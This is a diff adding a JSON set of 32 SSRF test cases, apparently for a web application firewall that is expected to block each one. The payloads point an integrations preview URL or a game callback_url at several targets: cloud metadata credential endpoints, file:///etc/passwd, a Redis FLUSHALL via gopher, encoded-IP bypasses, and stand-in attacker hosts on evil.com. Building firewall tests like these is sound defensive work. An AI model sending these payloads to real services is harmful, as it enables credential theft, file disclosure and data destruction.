@@ -1,0 +1,1026 @@
+[
+  {
+    "id": "ssrf-0001",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://169.254.169.254/latest/meta-data/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://169.254.169.254/latest/meta-data/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0002",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://169.254.169.254/latest/meta-data/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://169.254.169.254/latest/meta-data/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0003",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://127.0.0.1:9443/admin",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://127.0.0.1:9443/admin\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0004",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://127.0.0.1:9443/admin",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://127.0.0.1:9443/admin\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0005",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://localhost:6379/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://localhost:6379/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0006",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://localhost:6379/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://localhost:6379/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0007",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://[::1]:8080/__control/state",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://[::1]:8080/__control/state\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0008",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://[::1]:8080/__control/state",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://[::1]:8080/__control/state\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0009",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://169.254.169.254/latest/meta-data/iam/securi",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0010",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://169.254.169.254/latest/meta-data/iam/securi",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0011",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://metadata.google.internal/computeMetadata/v1",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://metadata.google.internal/computeMetadata/v1/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0012",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://metadata.google.internal/computeMetadata/v1",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://metadata.google.internal/computeMetadata/v1/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0013",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: file:///etc/passwd",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"file:///etc/passwd\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0014",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: file:///etc/passwd",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"file:///etc/passwd\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0015",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: gopher://127.0.0.1:6379/_FLUSHALL",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"gopher://127.0.0.1:6379/_FLUSHALL\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0016",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: gopher://127.0.0.1:6379/_FLUSHALL",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"gopher://127.0.0.1:6379/_FLUSHALL\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0017",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: dict://127.0.0.1:11211/stats",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"dict://127.0.0.1:11211/stats\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0018",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: dict://127.0.0.1:11211/stats",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"dict://127.0.0.1:11211/stats\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0019",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://0x7f000001/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://0x7f000001/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0020",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://0x7f000001/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://0x7f000001/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0021",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://2130706433/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://2130706433/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0022",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://2130706433/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://2130706433/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0023",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://127.0.0.1.nip.io/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://127.0.0.1.nip.io/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0024",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://127.0.0.1.nip.io/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://127.0.0.1.nip.io/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0025",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://attacker.evil.com/collect",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://attacker.evil.com/collect\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0026",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://attacker.evil.com/collect",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://attacker.evil.com/collect\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0027",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://sec-team.waf-exams.info@evil.com/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://sec-team.waf-exams.info@evil.com/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0028",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://sec-team.waf-exams.info@evil.com/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://sec-team.waf-exams.info@evil.com/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0029",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: https://assets.sec-team.waf-exams.info.evil.com/x",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"https://assets.sec-team.waf-exams.info.evil.com/x\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0030",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: https://assets.sec-team.waf-exams.info.evil.com/x",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"https://assets.sec-team.waf-exams.info.evil.com/x\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0031",
+    "class": "ssrf",
+    "name": "SSRF via integrations preview url",
+    "description": "Server-side request forgery through preview url: http://localhost%2523@evil.com/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/api/integrations/preview",
+      "auth": "none",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"url\": \"http://localhost%2523@evil.com/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  },
+  {
+    "id": "ssrf-0032",
+    "class": "ssrf",
+    "name": "SSRF via game callback_url",
+    "description": "SSRF through game-result callback_url: http://localhost%2523@evil.com/",
+    "severity": "high",
+    "source": "seed",
+    "tags": [
+      "owasp:A10"
+    ],
+    "request": {
+      "method": "POST",
+      "path": "/game/1/play",
+      "auth": "session",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Referer": "http://localhost:8080/",
+        "Content-Type": "application/json"
+      },
+      "body": "{\"bet\": 10, \"callback_url\": \"http://localhost%2523@evil.com/\"}",
+      "body_b64": false,
+      "execute": true
+    },
+    "expect": {
+      "verdict": "block",
+      "rule_id_contains": [
+        "ssrf"
+      ]
+    }
+  }
+]
